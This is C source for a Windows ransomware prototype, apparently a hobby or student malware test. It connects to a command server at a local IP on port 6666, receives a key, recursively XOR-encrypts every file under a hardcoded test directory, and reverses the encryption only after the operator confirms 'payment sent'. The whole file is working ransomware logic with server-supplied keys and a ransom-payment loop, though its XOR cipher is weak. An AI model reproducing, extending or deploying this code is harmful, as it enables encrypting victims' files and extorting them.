#include <stdio.h>
#include <string.h>
#include <dirent.h>
#include <sys/stat.h>
#include <winsock2.h>
#pragma comment(lib, "Ws2_32.lib")
#include <time.h>

// This function will encrypt a single file
void encryptFile(char* filePath, char key)
{
    // File is the file will be encrypted
    // tempFile is a temporary file which save encrypted data of file
    FILE* file;
    FILE* tempFile;
    char tempFilePath[] = "temp.txt";
    // Open file streams
    // Open file to read, temp file to write
    file = fopen(filePath, "r");
    tempFile = fopen(tempFilePath, "w");

    // Read byte by byte through file
    char byte;
    long long counter = 0;

    while (fscanf(file, "%c", &byte) > 0)
    {
        counter ++;
        //printf("%d, %d\n", byte, byte ^ key);
        // Encrypt this byte by xoring to the key
        byte ^= key;
        // Save this byte into temp file
        fprintf(tempFile, "%c", byte);
    }

    printf("%d\n", counter);

    // Close file streams
    fclose(file);
    fclose(tempFile);

    // Open file streams
    // But this time we will open file to write and temp file to read
    file = fopen(filePath, "w");
    tempFile = fopen(tempFilePath, "r");




    // Read through temp file byte by byte
    counter = 0;
    while (fscanf(tempFile, "%c", &byte) > 0)
    {
        // Save this byte into file
        fprintf(file, "%c", byte);
        counter++;
    }

    printf("%d\n", counter);

    // Close file streams
    fclose(file);
    fclose(tempFile);

    // Delete temp file
    remove(tempFilePath);
}

// This function will read through all directories and files in a directory
// If it find a file, it will encrypt that file
// If it find a directory, it will read through that directory
void encryptDirectory(char* directoryPath, char key)
{
    printf("%s\n", directoryPath);
    //char init_key = generate_key();
    //char stored_key = init_key;
    //char key = 36;

    DIR* directory;
    struct dirent* entry;
    struct stat status;
    char path[FILENAME_MAX];

    // Open the directory
    directory = opendir(directoryPath);
    printf("%d\n", directory);
    if (directory != NULL)
    {
        printf("ola1\n");
        // Open directory successfully
        // Read through directory
        while ((entry = readdir(directory)) != NULL)
        {
            // Check if this entry (file or directory) is current directory (".") or parent
            //directory ("..")
            if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0)
            {
                // Get entry full path
                strcpy(path, directoryPath);
                strcat(path, "\\");
                strcat(path, entry->d_name);
                // Check if this entry is a directory or file
                stat(path, &status);
                if (S_ISDIR(status.st_mode))
                {
                    printf("encryptdirectory");
                    // This is a directory
                    // We will read through it
                    encryptDirectory(path, key);
                } else {
                    printf("encryptfile\n");
                    encryptFile(path, key);
                }
            }
        }
    }
}

int main()
{


    SOCKET client_socket; // Create a SOCKET structure
    WSADATA wsastructure; // Create a WSADATA structure requiered for winsock initialization
    int result;
    struct sockaddr_in client_addr;
    char key_recv_buffer[1024] = "Key received. Encrypting...";
    char send_buffer[1024] = "";
    char recv_buffer[1024] = "";
    char key;

    result = WSAStartup(MAKEWORD(2, 2), &wsastructure); // Initialize winsock

    if(result != 0)
    {
        printf("[!] WinSock initialization failed \n"); // Print out the error and exit out of the program
        return 1;
    }

    client_socket = socket(AF_INET, SOCK_STREAM, 0);

    client_addr.sin_family = AF_INET;
    client_addr.sin_port = htons(6666);
    client_addr.sin_addr.s_addr = inet_addr("192.168.100.68");

    // Connect to the server
    if(connect(client_socket, (struct sockaddr*) &client_addr, sizeof(client_addr)) != 0)
    {
        printf("[!] Connection to the server failed\n"); // Print out the error and exit out of the program
        return 1;
    }
    printf("[+] Connected to the server\n");


    while (1)
    {   //Hasta que el server no valido que es el string de payment
        // Wait for response from server
        //recv(client_socket, recv_buffer, sizeof(recv_buffer), 0);
        printf("entro al while\n");
        recv(client_socket, &key, sizeof(key), 0);
        printf("%d\n", key);
        encryptDirectory("D:\\VS Code\\Malware test\\filestoencr", key);

        send(client_socket, key_recv_buffer, sizeof(key_recv_buffer), 0);
        // Print out response from server
        //printf("[+] New message: %s", recv_buffer);
        printf("ola\n");
        while (recv(client_socket, recv_buffer, sizeof(recv_buffer), 0) > 0)
        {
            printf("[+] New message: %s\n", recv_buffer);

            printf("Response: ");
            fgets(send_buffer, sizeof(send_buffer), stdin);

            // Send data to server
            send(client_socket, send_buffer, sizeof(send_buffer), 0);
            printf("\n[+] Response sent: %s", send_buffer);

            if (strcmp(send_buffer, "payment sent\n") == 0)
            {
                encryptDirectory("D:\\VS Code\\Malware test\\filestoencr", key);
                recv(client_socket, recv_buffer, sizeof(recv_buffer), 0);
                printf("\n[+] Congrats!!: %s", recv_buffer);

                closesocket(client_socket);
                WSACleanup();

                return 0;
            }
        }
    }


    return 0;
}
